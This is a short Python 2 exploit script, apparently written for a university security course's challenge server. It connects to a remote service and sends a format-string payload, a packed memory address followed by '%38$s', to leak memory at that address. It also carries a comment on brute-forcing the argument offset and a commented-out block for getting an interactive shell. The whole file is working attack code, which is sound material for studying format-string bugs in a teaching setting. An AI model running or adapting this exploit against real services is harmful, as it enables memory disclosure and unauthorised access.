#!/usr/bin/python2

import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10104

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))


# bruteforce:  {addr} % N $x
# find N = 38
payload = "\x60\xa0\x04\x08%" + str(38) + "$s"
soc.send(payload)
data = soc.recv(1024)
print(data)
soc.close()


## get interactive shell
#t = telnetlib.Telnet()
#t.sock = soc
#t.interact()

